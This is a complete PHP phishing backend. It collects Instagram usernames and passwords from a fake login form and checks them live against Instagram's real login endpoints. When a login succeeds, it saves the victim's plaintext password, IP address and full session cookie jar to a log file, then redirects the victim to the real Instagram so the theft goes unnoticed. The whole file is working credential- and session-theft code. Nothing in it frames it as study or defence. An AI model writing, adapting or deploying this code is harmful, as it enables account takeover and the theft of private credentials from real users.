<?php
/* ----------  only POST allowed  ---------- */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.php');
    exit;
}

/* ----------  real Instagram login  ---------- */
$username = trim($_POST['username'] ?? '');
$password = trim($_POST['password'] ?? '');
$ip       = $_SERVER['REMOTE_ADDR'];
$ua       = $_SERVER['HTTP_USER_AGENT'];
$time     = date('Y-m-d H:i:s');

function realInstaLogin($u, $p) {
    $ch = curl_init();
    // 1. CSRF
    curl_setopt_array($ch, [
        CURLOPT_URL            => "https://www.instagram.com/accounts/login/",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR      => "insta.jar",
        CURLOPT_USERAGENT      => $GLOBALS['ua'],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    $html = curl_exec($ch);
    preg_match('/"csrf_token":"(.*?)"/', $html, $m);
    $csrf = $m[1] ?? '';

    // 2. login
    $post = http_build_query([
        'username'      => $u,
        'enc_password'  => '#PWD_INSTAGRAM_BROWSER:0:0:'.$p,
        'queryParams'   => '{}',
        'optIntoOneTap' => 'false'
    ]);
    curl_setopt_array($ch, [
        CURLOPT_URL        => "https://www.instagram.com/accounts/login/ajax/",
        CURLOPT_POST       => true,
        CURLOPT_POSTFIELDS => $post,
        CURLOPT_HTTPHEADER => [
            "X-CSRFToken: $csrf",
            "X-Requested-With: XMLHttpRequest",
            "Referer: https://www.instagram.com/accounts/login/"
        ],
        CURLOPT_COOKIEFILE => "insta.jar"
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    return json_decode($resp, true);
}

$data   = realInstaLogin($username, $password);
$logFile = "cookies" . (string)(int)microtime(true) . ".txt";   // unique file

if (isset($data['authenticated']) && $data['authenticated']) {
    // success → save password + cookies
    $cookies = file_get_contents("insta.jar");
    $log = "TIME: " . date('Y-m-d H:i:s') . " | IP: $ip\n";
    $log .= "USERNAME: $username\nPASSWORD: $password\n";
    $log .= "------ COOKIE JAR ------\n$cookies\n------------------------\n\n";
    file_put_contents($logFile, $log, LOCK_EX);
    header("Location: https://www.instagram.com");
    exit();
}

// wrong password → alert + back
echo "<script>alert('❌ Wrong password. Please try again.'); history.back();</script>";
exit;
?>
